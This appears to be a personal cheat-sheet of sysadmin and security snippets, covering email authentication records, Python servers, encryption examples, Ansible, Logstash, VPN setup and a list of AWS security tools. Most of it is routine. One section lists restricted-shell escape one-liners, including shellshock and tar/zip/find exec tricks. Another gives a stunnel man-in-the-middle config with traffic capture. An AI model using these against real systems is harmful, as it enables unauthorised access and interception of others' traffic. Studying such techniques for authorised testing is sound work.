dig example.com TXT @ns.jamotipoki.com.		-->Output: exampple.com.		300	IN	TXT	"v=spf1 ip4:169.69.69.99 -all"

#Domain Keys Identified Mail (DKIM) 
DKIM is an email authentication method designed to detect email spoofing. It allows the receiver to check that an email claimed to have come from 
a specific domain was indeed authorized by the owner of that domain (TXT record in the DNS with the Public Key and the Private Key in the mail server)
All the information in the mail (header, body) will be signed and checked by the receiver with the Public Key of the DNS record.

#DMARC
It's policy in the mailserver to apply some actions depending on the SPF and DKIM.
https://en.wikipedia.org/wiki/DMARC
-----------

-----------HTTPs webserver python
# https://gist.github.com/dergachev/7028596
# Create certs:
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# Python code:
import BaseHTTPServer, SimpleHTTPServer
import ssl
httpd = BaseHTTPServer.HTTPServer(('localhost', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
-----------

-----------Encrypt/Decrypt RC4 with Python
from Crypto.Cipher import ARC4
obj1 = ARC4.new('01234567')
obj2 = ARC4.new('01234567')
text = 'abcdefghijklmnop'
cipher_text = obj1.encrypt(text)
print(cipher_text)
print(obj2.decrypt(cipher_text))
-----------

-----------Check Microsoft security update types - KB
https://www.catalog.update.microsoft.com/Search.aspx?q=KB4054173
-----------

-----------Create parent directories
install -DTm644 /dev/null foo/bar/baz
# Specially useful for:
find ./ | grep js | while read line; do install -DTm644 /dev/null ../temp/$line; done
-----------

-----------Pipe linux commands to the clipboard
echo pepe | xclip -selection c
-----------

-----------AES-CBC encrytpion Openssl
### Encrypt:
echo "hola pepe" | openssl enc -aes-256-cbc -nosalt -k imthesecretkey -iv 11223344556677889911223344556677 | base64
### Decrypt:
echo "iYg/Sotzes7BLyA0R6V1Hw==" | openssl enc -d -aes-256-cbc -nosalt -k imthesecretkey -iv 11223344556677889911223344556677 -base64
-----------

-----------Kiosk breakout keys - (Windows)
# https://www.trustedsec.com/2015/04/kioskpos-breakout-keys-in-windows/
-----------

-----------Libcurl with static libraries - (x86/x64)
# http://www.codepool.biz/build-use-libcurl-vs2015-windows.html
# https://www.youtube.com/watch?v=Eu7NFeg43T4
Version x64 (for x86 just follow the previous tutorial)
# https://github.com/spamv/libcurl-sample
-----------

-----------Slack API python send messages
### Get the token
# https://api.slack.com/custom-integrations/legacy-tokens

### Normal message:
import os
from slackclient import SlackClient
sc = SlackClient("XXXXX")
sc.api_call(
  "chat.postMessage",
  channel="testchannel",
  text="Hello Slack!",
  user="PEPETEST")
  
### Snippet message (file):
import os
from slackclient import SlackClient
sc = SlackClient("XXXXX")
sc.api_call(
  "files.upload",
  channels="testchannel",
  content="Hey Slack!\n#I'm a comment",
  filetype="python")
-----------

-----------Ansible
# ansible.cnf:
[defaults]
inventory = ./inventory
# inventory:
[digital_ocean]
<hostname> ansible_user=root ansible_ssh_private_key_file=/Users/pepe/.ssh/key
# list hosts
ansible --list-hosts all
# ping hosts
ansible -m ping all
# send a command
ansible -m command -a "ls -lrtha" all
-----------

-----------Json query tool online
# http://www.jsonquerytool.com/
# http://jmespath.org/		--> ansible
-----------

-----------AWS Tools (TODO*********review)
# https://blog.segu-info.com.ar/2018/07/recopilatorio-de-herramientas-para.html
# Defensivas (Fortificación, Auditoría de seguridad, Inventario):
Scout2: https://github.com/nccgroup/Scout2 - Herramienta de auditoría de seguridad para entornos AWS (Python)
Prowler: https://github.com/toniblyx/prowler - CIS benchmarks y comprobaciones adicionales para las mejores prácticas de seguridad en AWS (Shell Script)
Scans: https://github.com/cloudsploit/scans - Escáner de seguridad de AWS (NodeJS)
CloudMapper: https://github.com/duo-labs/cloudmapper - ayuda a analizar los entornos AWS (Python)
CloudTracker: https://github.com/duo-labs/cloudtracker - ayuda a encontrar usuarios y roles IAM con demasiados privilegios comparando los logs de CloudTrail con las políticas IAM (Python)
AWS Security Benchmarks: https://github.com/awslabs/aws-security-benchmark - scripts y plantillas para el framework de AWS CIS Foundation (Python)
AWS Public IPs: https://github.com/arkadiyt/aws_public_ips - Obtiene todas las direcciones IP públicas relacionadas con una cuenta AWS. Funciona con IPv4/IPv6, redes Classic/VPC y todos los servicios AWS (Ruby)
PMapper: https://github.com/nccgroup/PMapper - Evaluación automática y avanzada de AWS IAM (Python)
AWS-Inventory: https://github.com/nccgroup/aws-inventory - Hace un inventario de recursos en todas las regiones (Python)
Resource Counter: https://github.com/disruptops/resource-counter - Contabilidad el número de recursos por categoría
# Ofensivas:
weirdALL: https://github.com/carnal0wnage/weirdAAL - Librería de ataque AWS
Pacu: https://github.com/RhinoSecurityLabs/pacu - toolkit de penetration testing para AWS
Cred Scanner: https://github.com/disruptops/cred_scanner
AWS PWN: https://github.com/dagrz/aws_pwn
Cloudfrunt: https://github.com/MindPointGroup/cloudfrunt
Cloudjack: https://github.com/prevade/cloudjack
Nimbostratus: https://github.com/andresriancho/nimbostratus
Auditoría de seguridad contínua
Security Monkey: https://github.com/Netflix/security_monkey
Krampus (como complemento de Security Monkey ) https://github.com/sendgrid/krampus
Cloud Inquisitor: https://github.com/RiotGames/cloud-inquisitor
CloudCustodian: https://github.com/capitalone/cloud-custodian
Disable keys after X days: https://github.com/te-papa/aws-key-disabler
Repokid mínimos privilegios: https://github.com/Netflix/repokid
Wazuh CloudTrail module: https://documentation.wazuh.com/current/amazon/index.html
# DFIR:
AWS IR: https://github.com/ThreatResponse/aws_ir - Herramienta Forense y de Respuesta ante Incidentes específica de AWS
Margaritashotgun: https://github.com/ThreatResponse/margaritashotgun - herramienta de adquisión de memoria para Linux
LiMEaide: https://kd8bny.github.io/LiMEaide/ - herramienta de adquisión de memoria para Linux
Diffy: https://github.com/Netflix-Skunkworks/diffy - Herramienta de triage utilizada durante incidentes de seguridad centrados en la nube
Seguridad en el desarrollo
CFN NAG: https://github.com/stelligent/cfn_nag - CloudFormation security test (Ruby)
Git-secrets: https://github.com/awslabs/git-secrets
Repositorio de Reglas de Ejemplo para AWS: https://github.com/awslabs/aws-config-rules
# Auditoría de S3 Buckets:
https://github.com/Parasimpaticki/sandcastle
https://github.com/smiegles/mass3
https://github.com/koenrh/s3enum
https://github.com/tomdev/teh_s3_bucketeers/
https://github.com/eth0izzle/bucket-stream
https://github.com/gwen001/s3-buckets-finder
https://github.com/aaparmeggiani/s3find
https://github.com/bbb31/slurp
https://github.com/random-robbie/slurp
https://github.com/kromtech/s3-inspector
https://github.com/petermbenjamin/s3-fuzzer
https://github.com/jordanpotti/AWSBucketDump
https://github.com/bear/s3scan
https://github.com/sa7mon/S3Scanner
https://github.com/magisterquis/s3finder
https://github.com/abhn/S3Scan
https://breachinsider.com/honey-buckets/
https://www.buckhacker.com | https://www.thebuckhacker.com/   [Actualmente Offline]
https://buckets.grayhatwarfare.com/
# Formación:
http://flaws.cloud/
# Otros:
https://github.com/nagwww/s3-leaks - una lista de los mayores leaks
-----------

-----------Restricted Shells bypass (****TODO review)
# https://www.hackplayers.com/2018/05/tecnicas-para-escapar-de-restricted--shells.html

## Técnicas de explotación normales:
1) si "/" está permitido se puede ejecutar /bin/sh o /bin/bash.
2) si podemos ejecutar el comando cp podemos copiar /bin/sh o /bin/bash en el directorio.
3) ftp > !/bin/sh o !/bin/bash
4) gdb > !/bin/sh o !/bin/bash
5) more/man/less > !/bin/sh o !/bin/bash
6) vim > !/bin/sh o !/bin/bash
7) rvim > :python import os; os.system("/bin/bash )
8) scp > scp -S /path/yourscript x y:
9) awk > awk 'BEGIN {system("/bin/sh o /bin/bash")}'
10) find > find / -name test -exec /bin/sh o /bin/bash \;

## Técnicas de lenguajes de programación:
1) except > except spawn sh then sh.
2) python > python -c 'import os; os.system("/bin/sh")'
3) php > php -a then exec("sh -i");
4) perl > perl -e 'exec "/bin/sh";'
5) lua > os.execute('/bin/sh').
6) ruby > exec "/bin/sh"

## Técnicas avanzadas:
1) ssh > ssh username@IP -t "/bin/sh" or "/bin/bash"
2) ssh2 > ssh username@IP -t "bash --noprofile"
3) ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
4) ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"127.0.0.1 (SUID)
5) git > git help status > luego puedes ejecutar !/bin/bash
6) pico > pico -s "/bin/bash" luego puedes escribir /bin/bash y pulsar CTRL + T
7) zip > zip /tmp/test.zip /tmp/test -T --unzip -command="sh -c /bin/bash"
8) tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint -action=exec=/bin/bash
-----------

-----------Python Simple HTTP server to retrieve POST request
# https://blog.anvileight.com/posts/simple-python-http-server/
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, world!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(b'This is POST request. ')
        response.write(b'Received: ')
        response.write(body)
        self.wfile.write(response.getvalue())

httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
httpd.serve_forever()
-----------

-----------Logstash
### Install:
sudo apt-get update
sudo apt-get install default-jre			--> probably you have to install JRE8
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb https://artifacts.elastic.co/packages/6.x/apt stable main" | sudo tee -a /etc/apt/sources.list.d/elastic-6.x.list
sudo apt-get update
sudo apt-get install logstash

### Configure:
sudo usermod -a -G logstash <example-ec2-user>			--> add the user to the logstash group
sudo chown --recursive logstash:logstash /var/log/logstash		--> change ownership
sudo su <example-ec2-user>		--> to reload the changes of the permissions in the groups

### Example pipeline Apache output with geoip: (/etc/logstash/conf.d/apache.conf)
input {
file {
path => "/opt/bitnami/apache2/logs/access_log"
start_position => "beginning"
}
}
filter {
grok {match => { "message" => "%{HTTPD_COMMONLOG}" }}
geoip { source => "clientip" }
}
output {
stdout {}
}

### Install Amazon ES plugin:
sudo -E /usr/share/logstash/bin/logstash-plugin install logstash-output-amazon_es				--> install Amazon ES plugin

### Example pipeline Apache to AWS ES with geoip: (/etc/logstash/conf.d/apache.conf)
# Important: The index has to start with apache as the created template (GET /_template/apache-template) is using this apache* filter
input {
file {
path => "/opt/xxxxxxx/apache2/logs/access_log"
start_position => "beginning"
}
}
filter {
grok {match => { "message" => "%{HTTPD_COMMONLOG}" }}
geoip {
source => "clientip"
target => "geoip"
}
}
output {
amazon_es {
hosts => ["https://xxxxxxxxxxx.us-west-2.es.amazonaws.com"]
region => "us-west-2"
aws_access_key_id => 'XXXXXXXXXXXX'
aws_secret_access_key => 'XXXXXXXXXXXXXXXXXXXXX'
index => "apache-logstash-XXXXXX-%{+YYYY.MM.dd}"
template_name => "testtemplate"
}
}

### Run:
/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/apache.conf --path.settings /etc/logstash
-----------

-----------Install and Run wireguard VPN - Linux
### Install wireguard:
sudo apt install openresolv
sudo apt-get install wireguard

### Run the VPN (and check that it's working)
wg-quick up /media/sf_xxxx/wg0-client.conf
sudo wg show
curl ifconfig.co/country
-----------

-----------Expose internal network with WireGuard VPN
# https://golb.hplar.ch/2019/01/expose-server-vpn.html
-----------

-----------VPN over SSH - sshuttle
# https://github.com/sshuttle/sshuttle
### with keys:
sshuttle -r root@ssh-ip 0/0 --ssh-cmd 'ssh -i path/to/key' -- exclude ssh-ip
### reverse sshuttle?:
sshuttle --dns -r pepe@localhost:9999 0/0
ssh -R 9999:localhost:22 username@remoteip
-----------

-----------Sftp with sudo (remote) permissions - on Debian
sftp -s 'sudo -u root /usr/lib/sftp-server' admin@xx.xx.xx.xx
-----------

-----------Sshfs with sudo (remote) permissions - on Debian
sshfs admin@xx.xx.xx.xx:/ ./mounted/ -o sftp_server="/usr/bin/sudo -u root /usr/lib/openssh/sftp-server"
-----------

-----------Rsync with sudo (remote) permissions - on Debian
rsync -r -e ssh -a --rsync-path="sudo rsync" admin@xx.xx.xx.xx:/root/ mounted
-----------

-----------Mitm with stunnels4
# https://gist.github.com/ohpe/e02596a2c2247ea1a212e019c355e2c3
### Generate a SSL certificate
openssl req -batch -new -x509 -days 365 -nodes -out mitm.pem -keyout mitm.pem
### Run stunnel
stunnel mitm.conf
### ;mitm.conf:
[server]
client = no
cert= ./mitm.pem
accept = <EXPOSEDIP>:443
connect = 127.0.0.1:31337

[client]
client = yes
accept = 127.0.0.1:31337
connect = <TARGET>:443
### Capture unencrypted traffic
sudo tcpdump -ilo -s0 -v -w ./mitm.pcap 'port 31337'
-----------
